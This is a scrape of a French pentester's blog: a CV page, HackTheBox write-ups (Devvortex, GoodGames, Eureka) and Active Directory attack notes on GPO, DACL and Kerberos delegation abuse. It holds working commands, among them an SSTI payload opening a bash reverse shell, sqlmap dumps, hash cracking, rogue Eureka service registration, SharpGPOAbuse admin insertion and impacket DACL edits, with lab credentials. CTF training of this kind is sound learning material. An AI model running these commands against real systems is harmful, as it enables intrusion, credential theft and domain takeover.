Stormspotter, ROADtools, AADInternals ‚òÅÔ∏è AWS Security IAM (Roles, Policies, MFA, SCP) Logging \u0026amp; audit : CloudTrail, Config, CloudWatch D√©tection \u0026amp; alertes : GuardDuty, Security Hub, Macie Outils Red Team : Pacu, enumerate-iam, cloudsplaining, ScoutSuite üìä SIEM Splunk : SPL, d√©tection de comportements, dashboards QRadar : corr√©lation, offenses, log sources Wazuh : HIDS, ELK, int√©gration Sysmon üìå Cas pratiques D√©tection brute force, exfiltration DNS Analyse de logs AD, GPO, acc√®s privil√©gi√©s Threat Hunting MITRE ATT\u0026amp;CK ‚öôÔ∏è SOAR Cortex XSOAR : Playbooks automatis√©s : enrichissement IOC, blocage IP Int√©gration avec EDR, SIEM, antivirus, email Cas d‚Äôusage : phishing, quarantaine automatique, sandbox analyse üß™ Analyse de Logs \u0026amp; R√©ponse √† Incident Journaux : Syslog, Event Viewer, Apache/Nginx, Firewall, AV/EDR Techniques de Threat Hunting (MITRE, hypothesis-based) Outils : YARA, Sigma, Sysmon, KAPE, Velociraptor üìà Vulnerability Management Outils : Nessus, OpenVAS, CVE.sh Processus : Scans r√©currents, CVSS scoring Patch management, hardening, benchmark CIS/STIG Reporting : priorisation, KPI, plans de rem√©diation üß∞ Outils Techniques Offensive Burp Suite, Nmap, Metasploit, Wireshark Impacket, CrackMapExec, BloodHound Responder, Rubeus, PowerView, Mimikatz Tools Web : SQLmap, FFUF, Dirsearch, ZAP Reverse \u0026amp; Post-exploitation Ghidra, strings, radare2, Powershell Empire, Covenant ü§ñ Automatisation \u0026amp; Scripting Bash : durcissement Linux, audits, automatisation PowerShell : scripts d‚Äôaudit AD, post-exploitation Windows Python : scrapers, outils offensifs, parsing, APIs Frameworks : Requests, Paramiko, Nmap, Shodan, Flask, PyInstaller üöÄ CI/CD \u0026amp; DevSecOps GitHub Actions, Azure DevOps : CI/CD, linters, scan SAST Docker : images s√©curis√©es, vuln√©rabilit√© scan (Trivy, Snyk) Kubernetes (base) : RBAC, secrets, pods, monitoring Int√©gration des outils de s√©curit√© dans les pipelines (DevSecOps) üíª Langages de Programmation Python : outils de pentest, d√©tection de vuln√©rabilit√©s PHP : d√©veloppement Web (Laravel), injections C / C++ : exploitation m√©moire, reverse engineering JavaScript : d√©veloppement web ","permalink":"https://nyobemichel.me/about/","summary":"\u003cdiv style=\"font-size: 13px;\"\u003e\n\u003cp\u003e\u003cstrong\u003eMichel NYOBE\u003c/strong\u003e | Pentester \u0026amp; Cloud Security Enthusiast\u003cbr\u003e\nüìç Paris, France | üìß \u003ca href=\"mailto:michelnyobe87@gmail.com\"\u003emichelnyobe87@gmail.com\u003c/a\u003e | üîê\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"profil\"\u003eProfil\u003c/h2\u003e\n\u003cp\u003ePassionn√© par la \u003cstrong\u003ecybers√©curit√© offensive\u003c/strong\u003e, le je me sp√©cialise dans les attaques \u003cstrong\u003eActive Directory\u003c/strong\u003e, le pentesting d‚Äôenvironnements cloud (Azure \u0026amp; AWS), et la s√©curit√© des identit√©s. En formation continue et √† la recherche d‚Äôun poste/apprentissage en Red Team ou pentest.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"labs-et-environnements\"\u003eLabs et Environnements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eActive Directory Lab (6 VM) automatis√© sur Azure\u003c/li\u003e\n\u003cli\u003ePlateformes :\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eTryHackMe\u003c/p\u003e","title":"Whoami /All"},{"content":"Enumeration Nmap Nous avons d√©but√© l\u0026rsquo;engagement par une analyse de port √† l\u0026rsquo;aide de l\u0026rsquo;outil Nmap afin d\u0026rsquo;identifier les services expos√©s sur la cible.\nnmap -sV -sC 10.10.11.242 -v --min-rate 1000 -Pn -T4 -p- Les r√©sultats du scan Nmap indiquent que seuls les ports 22 (SSH) et 80 (HTTP) sont ouverts sur la cible.\nLors de l\u0026rsquo;analyse, nous avons identifi√© le domaine devvortex.htb, qu‚Äôil a √©t√© n√©cessaire d‚Äôajouter manuellement au fichier hosts local afin d‚Äôen permettre la r√©solution DNS.\nSuite √† l‚Äô√©num√©ration des sous-domaines et des r√©pertoires √† l‚Äôaide de l‚Äôoutil ffuf , nous avons d√©couvert un sous-domaine suppl√©mentaire : dev.devvortex.htb.\nL‚Äô√©num√©ration des domaines associ√©s √† dev.devvortex.htb nous a permis d‚Äôidentifier une interface d‚Äôadministration accessible via dev.devvortex.htb/administrator, sur laquelle nous avons constat√© la pr√©sence d‚Äôun template Joomla.\nApr√®s avoir identifi√© l‚Äôutilisation du CMS Joomla, nous avons analys√© les fichiers accessibles publiquement et inspect√© le code source de la page d‚Äôadministration. Cette investigation nous a permis de retrouver un fichier joomla.xml, situ√© dans /administrator/manifests/files/, contenant les m√©tadonn√©es du CMS, notamment sa version exacte. Une v√©rification crois√©e via des recherches en ligne a confirm√© la version identifi√©e.\nNous avons ensuite effectu√© des recherches en ligne concernant la version identifi√©e de Joomla et avons d√©couvert qu‚Äôelle est affect√©e par une vuln√©rabilit√© connue et nous l\u0026rsquo;avions exploite\nruby exploit.rb http://dev.devvortex.htb user : lewis password: P4ntherg0t1n5r3c0n##\nServer-Side Template injection Apr√®s avoir acc√©d√© √† l‚Äôinterface d‚Äôadministration Joomla, nous avons exploit√© une vuln√©rabilit√© de type Server-Side Template Injection (SSTI) pr√©sente dans le gestionnaire de templates. Cette faille nous a permis d‚Äôinjecter du code c√¥t√© serveur et d‚Äôobtenir une ex√©cution de commandes arbitraires sur la machine cible.\nApr√®s l‚Äôexploitation initiale, nous avons poursuivi avec une phase d‚Äô√©num√©ration des services internes disponibles sur le r√©seau. Cette analyse nous a permis d‚Äôidentifier un service MySQL en cours d‚Äôex√©cution. En nous connectant √† ce service, nous avons pu √©num√©rer les bases de donn√©es ainsi que leurs tables. Cette exploration nous a permis de r√©cup√©rer des informations sensibles, notamment les identifiants associ√©s √† l‚Äôutilisateur \u0026rsquo;logan'.\nnc -lvnp 443 $ ss -tlpn $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u\nlogan tequieromucho\nGr√¢ce √† l\u0026rsquo;identification du hash bcrypt associ√© √† l\u0026rsquo;utilisateur \u0026rsquo;logan\u0026rsquo;, nous avons r√©ussi √† retrouver le mot de passe en clair par attaque par dictionnaire. Cela nous a permis de nous connecter avec succ√®s en ssh .\nhashcat -m 3200 lol.txt /home/kali/Documents/TryHackme/Wordlist/rockyou.txt Elevation de privilege Dans le cadre de l‚Äô√©l√©vation de privil√®ges, nous avons analys√© l‚Äôenvironnement du syst√®me compromis √† la recherche de vuln√©rabilit√©s locales. Cette analyse nous a permis d‚Äôidentifier une faille de s√©curit√© connue, r√©f√©renc√©e sous un identifiant CVE-2023-1326, exploitable sur le syst√®me. En tirant parti de cette vuln√©rabilit√©, nous avons obtenu un acc√®s privil√©gi√© (root) √† la machine\nReferences https://github.com/Acceis/exploit-CVE-2023-23752 https://github.com/diego-tella/CVE-2023-1326-PoC https://x.com/7h3h4ckv157/status/1728753489839628604 https://www.revshells.com/ https://academy.hackthebox.com/module/details/145\n","permalink":"https://nyobemichel.me/posts/devvortex/","summary":"Difficulte : esay","title":"Devvortex -HTB"},{"content":"Enumeration Nmap Nous d√©butons notre phase de reconnaissance par un scan Nmap de la cible.\n80/tcp open http Werkzeug httpd 2.0.2 (Python 3.9.2) |_http-title: GoodGames | Community and Store | http-methods: |_ Supported Methods: GET HEAD OPTIONS POST |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB L‚Äôanalyse r√©v√®le que seul le port 80 est ouvert et qu‚Äôil h√©berge un serveur HTTP Python via Werkzeug 2.0.2.\nServeur Web Python En acc√©dant au site via le port 80, nous tombons sur une interface web : http://goodgames.htb/\nAjout de l‚Äôentr√©e DNS au fichier hosts :\nsudo echo \u0026#34;10.10.11.130 goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts En inspectant la fonctionnalit√© de connexion, une tentative d\u0026rsquo;injection SQL est envisag√©e. Toutefois, l\u0026rsquo;application impose la saisie d‚Äôune adresse e-mail valide.\nNous utilisons alors une adresse valide, puis interceptons la requ√™te dans Burp Suite pour modifier l‚Äôe-mail en admin@goodgames.htb. Une fois soumise, un message de bienvenue s‚Äôaffiche, indiquant une possible compromission du compte administrateur.\nInjection SQL Apr√®s confirmation d\u0026rsquo;une vuln√©rabilit√© SQLi, nous enregistrons la requ√™te HTTP dans un fichier nomm√© goodgames.req afin de l\u0026rsquo;exploiter avec sqlmap.\nsqlmap -r goodgames.req --dbs Sqlmap r√©v√®le deux bases de donn√©es :\ninformation_schema\nmain\nNous listons ensuite les tables de la base main :\nsqlmap -r goodgames.req -D main --tables Et enfin, nous extrayons les donn√©es de la table user :\nsqlmap -r goodgames.req -D main -T user --dump R√©sultat :\nadmin@goodgames.htb : superadministrator Portail Interne d\u0026rsquo;Administration En haut √† droite du tableau de bord, une ic√¥ne d‚Äôengrenage m√®ne √† une URL interne :\nhttp://internal-administration.goodgames.htb/login\nAjout de l‚Äôentr√©e dans le fichier hosts :\nsudo echo \u0026#34;10.10.11.130 internal-administration.goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Nous utilisons les identifiants extraits (admin / superadministrator) pour acc√©der √† l‚Äôinterface d\u0026rsquo;administration. Cela nous donne acc√®s au dashboard.\nSSTI (Server-Side Template Injection) Nous suspectons une vuln√©rabilit√© SSTI. Une charge utile de test est inject√©e :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;id\u0026#39;).read() }} La commande est ex√©cut√©e, confirmant la vuln√©rabilit√©. Nous exploitons cela pour obtenir un reverse shell :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;).read() }} Escalade de Privil√®ges √ânum√©ration L‚Äôenvironnement montre plusieurs signes d‚Äôune ex√©cution dans un conteneur Docker. On y observe √©galement des fichiers li√©s √† un utilisateur inconnu (UID 1000) inexistant dans /etc/passwd.\nUne adresse IP priv√©e sugg√®re une architecture en r√©seau Docker. Nous r√©alisons un scan ping :\nfor i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done Et un scan des ports :\nfor port in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$port \u0026amp;\u0026amp; echo \u0026#34;$port open\u0026#34;; done 2\u0026gt;/dev/null Le processus docker est actif sur le syst√®me.\nL\u0026rsquo;utilisateur augustus, pr√©sent sur le syst√®me, dispose d‚Äôun r√©pertoire utilisateur contenant des fichiers identiques √† ceux du conteneur.\n√âvasion de Conteneur \u0026amp; Acc√®s Root Nous copions /bin/bash dans le r√©pertoire d‚Äôaugustus :\nPuis ex√©cutons le binaire avec l‚Äôoption -p pour pr√©server les privil√®ges root :\n./bash -p Cela nous accorde un shell avec les droits root hors du conteneur.\n","permalink":"https://nyobemichel.me/posts/goodgame/","summary":"Difficulte : esay","title":"GoodGame-HTB"},{"content":"Enumeration Nmap Enumeration Nmap Nous commen√ßons par ex√©cuter une analyse nmap sur la cible :\nLe scan r√©v√®le que les ports 22, 80 et 8761 sont ouverts sur la cible.\nEn explorant le port 80, nous avons d√©couvert un site web accessible √† l\u0026rsquo;adresse furni.htb.\nAfin d‚Äôidentifier d‚Äô√©ventuelles ressources non list√©es accessibles sur le serveur web de la cible http://furni.htb, un fuzzing de r√©pertoires a √©t√© r√©alis√© √† l‚Äôaide de l‚Äôoutil ffuf.\nffuf -u http://furni.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt Cela m\u0026rsquo;a permis d‚Äôidentifier plusieurs sous-domaines associ√©s √† la cible. Ces sous-domaines peuvent h√©berger des fichiers, dossiers ou applications suppl√©mentaires potentiellement int√©ressants √† la suite de l‚Äôanalyse.\nApr√®s avoir t√©l√©charg√© l\u0026rsquo;ensemble des fichiers disponibles et entam√© leur analyse un par un, j\u0026rsquo;ai identifi√© un fichier nomm√© headpdump. En examinant son contenu, j\u0026rsquo;ai recherch√© la pr√©sence √©ventuelle d\u0026rsquo;informations sensibles telles que des identifiants ou des mots de passe. Cette inspection m‚Äôa permis de mettre en √©vidence des donn√©es potentiellement int√©ressantes.\npassword=0sc@r190_S0l!dP@sswd, user=oscar190\nhttp://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!\nOscar parvient √† se connecter via SSH, mais j\u0026rsquo;ai √©galement rep√©r√© le service Eureka. Afin d\u0026rsquo;y acc√©der, je vais configurer une redirection de port pour pouvoir me connecter au port 8761.\nssh -L 8761:localhost:8761 oscar190@10.10.11.66 Les identifiants r√©cup√©r√©s seront test√©s sur l‚Äôensemble des interfaces de connexion identifi√©es pr√©c√©demment. login: EurekaSrvr password: 0scarPWDisTheB3st\nNous allons d√©ployer un service factice bas√© sur l‚Äôexemple \u0026ldquo;Hacking Netflix Eureka\u0026rdquo;, dans le but de simuler une pr√©sence l√©gitime au sein de l‚Äôenvironnement et d‚Äôexploiter la confiance accord√©e aux services enregistr√©s.\ncurl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{ \u0026#34;instance\u0026#34;: { \u0026#34;instanceId\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;hostName\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;app\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;ipAddr\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;vipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;secureVipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;UP\u0026#34;, \u0026#34;port\u0026#34;: { \u0026#34;$\u0026#34;: 8081, \u0026#34;@enabled\u0026#34;: \u0026#34;true\u0026#34; }, \u0026#34;dataCenterInfo\u0026#34;: { \u0026#34;@class\u0026#34;: \u0026#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MyOwn\u0026#34; } } }\u0026#39; Nous avons r√©ussi √† extraire le nom d\u0026rsquo;utilisateur et le mot de passe associ√©s au service cibl√©, ce qui permet une √©l√©vation des privil√®ges ou un acc√®s non autoris√© aux ressources internes.\nusername=miranda.wise%40furni.htb\u0026amp;password=IL%21veT0Be%26BeT0L0ve\u0026amp;_csrf=JIVbCzoWJkTBdEsVTbZrxfWiTajQj9Lg9FvXWFIcckIGJ5AuQOM_aFknH3DsRigsLJtf88DBYMm1vefNwG7vYGd-SyA1QqhP ! password : IL!veT0Be\u0026amp;BeT0L0ve\nCyberChef - GCHQ\nHacking Netflix Eureka - Backbase\n","permalink":"https://nyobemichel.me/posts/eureka/","summary":"Difficulte : esay","title":"Eureka-HTB"},{"content":"Bienvenue dans mon premier article Hugo ! üéâ\nPourquoi utiliser Hugo ? üí® Rapide üìÑ Bas√© sur Markdown üé® Personnalisable avec des th√®mes comme PaperMod Ce que tu peux faire Ajouter des images Cr√©er des liens internes G√©n√©rer un site statique complet Exemple de code hugo new posts/mon-article.md ","permalink":"https://nyobemichel.me/posts/example/","summary":"Ceci est un exemple de post pour tester Hugo avec le th√®me PaperMod.","title":"Bienvenue sur mon premier article"},{"content":"SharpGPOAbuse.exe\n1. commande PowerShell utilis√©e pour cr√©er un nouvel objet de strat√©gie de group New-GPO -Name \u0026#34;pwnedGPO 2.creer un nouveau GPO nomm√© evil et li√© √† l\u0026rsquo;unit√© d\u0026rsquo;organisation des contr√¥leurs de domaine. New-GPO -Name PwnedGPO | New-GPLink -Target \u0026#34;OU=DOMAIN CONTROLLERS,D C=FRIZZ,DC=HTB\u0026#34; -LinkEnabled Yes 3. Modifier l\u0026rsquo;objet de strat√©gie de groupe pour ajouter un administrateur local .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount \u0026lt;Users\u0026gt;--GPO Name PwnedGPO 4.Force GPO Update gpupdate /force 5.Spawn Administrative Shell RunasCs.exe pour lancer un shell cmd.exe avec les identifiants\n\\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r Your-machine-ip: 4444 https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more\n","permalink":"https://nyobemichel.me/posts/activedirectory/abuse-gpo/","summary":"\u003cp\u003eSharpGPOAbuse.exe\u003c/p\u003e\n\u003ch3 id=\"1-commande-powershell-utilis√©e-pour-cr√©er-un-nouvel-objet-de-strat√©gie-de-group\"\u003e1. commande PowerShell utilis√©e pour cr√©er un nouvel objet de strat√©gie de group\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eNew-GPO -Name \u0026#34;pwnedGPO\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"2creer-un-nouveau-gpo-nomm√©-evil-et--li√©-√†-lunit√©-dorganisation-des-contr√¥leurs-de-domaine\"\u003e2.creer un nouveau GPO nomm√© evil et  li√© √† l\u0026rsquo;unit√© d\u0026rsquo;organisation des contr√¥leurs de domaine.\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eNew-GPO -Name PwnedGPO | New-GPLink -Target \u0026#34;OU=DOMAIN CONTROLLERS,D\nC=FRIZZ,DC=HTB\u0026#34; -LinkEnabled Yes\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"3-modifier-lobjet-de-strat√©gie-de-groupe-pour-ajouter-un-administrateur-local\"\u003e3. Modifier l\u0026rsquo;objet de strat√©gie de groupe pour ajouter un administrateur local\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount \u0026lt;Users\u0026gt;--GPO\nName PwnedGPO\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"4force-gpo-update\"\u003e4.Force GPO Update\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egpupdate /force\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"5spawn-administrative-shell\"\u003e5.Spawn Administrative Shell\u003c/h3\u003e\n\u003cp\u003eRunasCs.exe pour lancer un shell cmd.exe avec les identifiants\u003c/p\u003e","title":""},{"content":"¬†exploitation des vuln√©rabilit√©s du contr√¥le d\u0026rsquo;acc√®s Windows/Active Directory pour l\u0026rsquo;√©l√©vation des privil√®ges, la persistance et les mouvements lat√©raux. Couvre les techniques offensives d\u0026rsquo;abus des ACL, l\u0026rsquo;analyse BloodHound et les m√©thodes de renforcement d√©fensif pour les √©quipes de s√©curit√© des entreprises. Une liste de contr√¥le d\u0026rsquo;acc√®s (ACL) est une liste d\u0026rsquo; entr√©es de contr√¥le d\u0026rsquo;acc√®s (ACE). Chaque ACE d\u0026rsquo;une ACL identifie un administrateur et sp√©cifie les droits d\u0026rsquo;acc√®s autoris√©s, refus√©s ou audit√©s pour cet administrateur. Le descripteur de s√©curit√© d\u0026rsquo;un objet s√©curisable peut contenir deux types d\u0026rsquo;ACL : une DACL et une SACL . Une liste de contr√¥le d\u0026rsquo;acc√®s discr√©tionnaire (DACL) identifie les personnes autoris√©es ou non √† acc√©der √† un objet s√©curisable. Lorsqu\u0026rsquo;un processus tente d\u0026rsquo;acc√©der √† un objet s√©curisable, le syst√®me v√©rifie les ACE de la DACL de l\u0026rsquo;objet afin de d√©terminer s\u0026rsquo;il doit y acc√©der. DAC La m√©thode traditionnelle de mise en ≈ìuvre du contr√¥le d\u0026rsquo;acc√®s contr√¥le l\u0026rsquo;acc√®s en fonction de l\u0026rsquo;identit√© du demandeur et des r√®gles d\u0026rsquo;acc√®s qui pr√©cisent ce que les demandeurs sont autoris√©s √† faire (ou non). Ce contr√¥le d\u0026rsquo;acc√®s est discr√©tionnaire , car une entit√© peut disposer de droits d\u0026rsquo;acc√®s lui permettant, de son propre chef, d\u0026rsquo;autoriser une autre entit√© √† acc√©der √† une ressource ; contrairement √† MAC , o√π l\u0026rsquo;entit√© ayant acc√®s √† une ressource ne peut pas, de son propre chef, autoriser une autre entit√© √† y acc√©der. Windows est un exemple de syst√®me d\u0026rsquo;exploitation DAC , qui utilise des listes de contr√¥le d\u0026rsquo;acc√®s discr√©tionnaires ( DACL ).\nAbus d\u0026rsquo;AD-DACL¬†: WriteOwner une technique puissante permettant aux attaquants de modifier la propri√©t√© des objets de l\u0026rsquo;annuaire. Plus pr√©cis√©ment, en abusant de l\u0026rsquo;autorisation WriteOwner dans¬†les listes de contr√¥le d\u0026rsquo;acc√®s discr√©tionnaires (DACL)¬†, les adversaires peuvent prendre le contr√¥le d\u0026rsquo;objets sensibles et √©lever leurs privil√®ges au sein du domaine.\n1 . [[impacket]] Outil Linux Impacket ‚Äì Octroi de la propri√©t√© et du contr√¥le total √Ä partir de syst√®mes de type UNIX, cela peut √™tre fait avec¬†owneredit.py\nimpacket-owneredit -action write -new-owner \u0026#39;\u0026lt;username\u0026gt;\u0026#39; -target-dn \u0026#39;CN=Management,CN=Users,DC=domaine,DC=local\u0026#39; \u0026#39;\u0026lt;domain name\u0026gt;\u0026#39;/\u0026#39;\u0026lt;username\u0026gt;\u0026#39;:\u0026#39;\u0026lt;password\u0026gt;\u0026#39; Avec l\u0026rsquo;aide de owneredit, le DACL de cet objet est modifi√© avec succ√®s, Accordons √† un utilisateur un contr√¥le total¬†sur le groupe Administrateurs du domaine √† l\u0026rsquo;aide de l\u0026rsquo;outil dacledit d\u0026rsquo;Impacket.\nimpacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;\u0026lt;username\u0026gt;\u0026#39; -target-dn \u0026#39;CN=Admins du domaine,CN=Utilisateurs,DC=domaine,DC=local\u0026#39; \u0026#39;\u0026lt;domain name\u0026gt;\u0026#39; / \u0026#39;\u0026lt;username\u0026gt;\u0026#39; : \u0026#39;password\u0026#39; -dc-ip \u0026lt;Domain_ip\u0026gt; python3 /opt/impacket-with-dacledit/examples/dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -inheritance -principal \u0026#39;judith.mader\u0026#39; -target \u0026#39;management\u0026#39; \u0026#34;certified.htb\u0026#34;/\u0026#34;judith.mader\u0026#34;:\u0026#39;judith09\u0026#39; Avec l\u0026rsquo;aide de dacledit, le DACL de cet objet est modifi√© avec succ√®s,¬†l\u0026rsquo;¬†utilisateur a d√©sormais¬†un contr√¥le total¬†sur le¬†groupe\nAjout d\u0026rsquo;un membre au groupe Le testeur peut abuser de cette autorisation en ajoutant l\u0026rsquo;utilisateur au groupe Administrateur de domaine et en r√©pertoriant les membres administrateurs de domaine pour garantir que les utilisateurs deviennent administrateurs de domaine.\nnet rpc group addmem \u0026#34;Domain Admins\u0026#34; \u0026lt;username\u0026gt; -U ignite.local/aaru%\u0026#39;Password@1\u0026#39; -S Domain_ip Abus d\u0026rsquo;AD-DACL¬†: AddSelf Abus d\u0026rsquo;AD-DACL¬†: WriteDacl Utilisation abusive d\u0026rsquo;AD-DACL¬†: GenericWrite Abuser d\u0026rsquo;AD-DACL¬†: ForceChangePassword Abuser d\u0026rsquo;AD-DACL¬†:¬†AllExtendedRights https://www.hackingarticles.in/category/dacl-attacks/\n","permalink":"https://nyobemichel.me/posts/activedirectory/abusing-active-directory-acls/","summary":"\u003cp\u003e¬†exploitation des vuln√©rabilit√©s du contr√¥le d\u0026rsquo;acc√®s Windows/Active Directory pour l\u0026rsquo;√©l√©vation des privil√®ges, la persistance et les mouvements lat√©raux. Couvre les techniques offensives d\u0026rsquo;abus des ACL, l\u0026rsquo;analyse BloodHound et les m√©thodes de renforcement d√©fensif pour les √©quipes de s√©curit√© des entreprises.\n¬†Une liste de contr√¥le d\u0026rsquo;acc√®s (ACL) est une liste d\u0026rsquo; entr√©es de contr√¥le d\u0026rsquo;acc√®s (ACE). Chaque ACE d\u0026rsquo;une ACL identifie un administrateur et sp√©cifie les droits d\u0026rsquo;acc√®s autoris√©s, refus√©s ou audit√©s pour cet administrateur. Le descripteur de s√©curit√© d\u0026rsquo;un objet s√©curisable peut contenir deux types d\u0026rsquo;ACL : une DACL et une SACL .\n¬†Une liste de contr√¥le d\u0026rsquo;acc√®s discr√©tionnaire (DACL) identifie les personnes autoris√©es ou non √† acc√©der √† un objet s√©curisable. Lorsqu\u0026rsquo;un processus tente d\u0026rsquo;acc√©der √† un objet s√©curisable, le syst√®me v√©rifie les ACE de la DACL de l\u0026rsquo;objet afin de d√©terminer s\u0026rsquo;il doit y acc√©der.\n¬†\u003ccode\u003eDAC\u003c/code\u003e La m√©thode traditionnelle de mise en ≈ìuvre du contr√¥le d\u0026rsquo;acc√®s contr√¥le l\u0026rsquo;acc√®s en fonction de l\u0026rsquo;identit√© du demandeur et des r√®gles d\u0026rsquo;acc√®s qui pr√©cisent ce que les demandeurs sont autoris√©s √† faire (ou non). Ce contr√¥le d\u0026rsquo;acc√®s est discr√©tionnaire , car une entit√© peut disposer de droits d\u0026rsquo;acc√®s lui permettant, de son propre chef, d\u0026rsquo;autoriser une autre entit√© √† acc√©der √† une ressource ; contrairement √† MAC , o√π l\u0026rsquo;entit√© ayant acc√®s √† une ressource ne peut pas, de son propre chef, autoriser une autre entit√© √† y acc√©der. Windows est un exemple de syst√®me d\u0026rsquo;exploitation DAC , qui utilise des listes de contr√¥le d\u0026rsquo;acc√®s discr√©tionnaires ( DACL ).\u003c/p\u003e","title":""},{"content":"AD CS est un r√¥le serveur qui fonctionne comme l\u0026rsquo;impl√©mentation de l\u0026rsquo;infrastructure √† cl√©s publiques PKI de Microsoft. Comme pr√©vu, il s\u0026rsquo;int√®gre √©troitement √† Active Directory et permet l\u0026rsquo;√©mission de certificats, qui sont des documents √©lectroniques sign√©s num√©riquement au format X.509, utilisables pour le chiffrement, la signature de messages et/ou l\u0026rsquo;authentification (notre axe de recherche).\nhttps://github.com/GhostPack/PSPKIAudit https://posts.specterops.io/certified-pre-owned-d95910965cd2\n","permalink":"https://nyobemichel.me/posts/activedirectory/adcs-attack/","summary":"\u003cp\u003eAD CS est un r√¥le serveur qui fonctionne comme l\u0026rsquo;impl√©mentation de l\u0026rsquo;infrastructure √† cl√©s publiques PKI de Microsoft.\nComme pr√©vu, il s\u0026rsquo;int√®gre √©troitement √† Active Directory et permet l\u0026rsquo;√©mission de certificats, qui sont des documents √©lectroniques sign√©s num√©riquement au format X.509, utilisables pour le chiffrement, la signature de messages et/ou l\u0026rsquo;authentification (notre axe de recherche).\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/GhostPack/PSPKIAudit\"\u003ehttps://github.com/GhostPack/PSPKIAudit\u003c/a\u003e\n\u003ca href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\"\u003ehttps://posts.specterops.io/certified-pre-owned-d95910965cd2\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/bypassing-wdeck/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/cross-forest-attack/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/database-link-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/dcsync-attaque/","summary":"","title":""},{"content":"Qu‚Äôest-ce que la d√©l√©gation Kerberos ? La d√©l√©gation Kerberos est un param√®tre de d√©l√©gation qui permet aux applications de demander des informations d‚Äôidentification d‚Äôacc√®s √† l‚Äôutilisateur final pour acc√©der aux ressources pour le compte de l‚Äôutilisateur d‚Äôorigine.\nLes trois principaux types de d√©l√©gation que je vais couvrir sont les suivants:\nD√©l√©gation sans contrainte : tout service peut √™tre utilis√© de mani√®re abusive si l‚Äôune de ses entr√©es de d√©l√©gation est sensible. D√©l√©gation contrainte : les entit√©s contraintes peuvent √™tre abus√©es si l‚Äôune de leurs entr√©es de d√©l√©gation est sensible. D√©l√©gation contrainte bas√©e sur les ressources (RBCD) : les entit√©s contraintes bas√©es sur les ressources peuvent √™tre abus√©es si l‚Äôentit√© elle-m√™me est sensible. D√©l√©gation contrainte La d√©l√©gation contrainte permet aux administrateurs de configurer les services auxquels un compte utilisateur ou ordinateur peut d√©l√©guer et quels protocoles d\u0026rsquo;authentification peuvent √™tre utilis√©s\nExploitation Technique 1 Pour exploiter la d√©l√©gation contrainte, nous avons besoin de trois choses essentielles :\nUn compte compromis configur√© avec une d√©l√©gation contrainte Un compte privil√©gi√© cible pour se faire usurper en demandant l\u0026rsquo;acc√®s au service Informations sur la machine h√©bergeant le service auquel nous aurons acc√®s Tout d\u0026rsquo;abord, nous allons voirsi la d√©l√©gation contrainte du compte ¬´Admnistrateur¬ª est configur√©e pour:\nGet-ADUser Administrateur -Properties msDs-AllowedToDelegateTo | select -ExpandProperty msDs-AllowedToDelegateTo en utilisant Kekeo nous demandons le compte TGT pour le compte\nkeko # tgt : : ask /user:NameUser /domain:NameDomain /rc4 Maintenant que nous avons le TGT, nous ex√©cutons la demande TGS pour le compte que nous voulons imiter pour le service cible que le compte\nkeko # tgs : : s4u /tgt:namedufichier.kirbi /user:nom /service:nameservice En revenant √† Mimikatz, nous pouvons utiliser Pass the Ticket pour acc√©der au 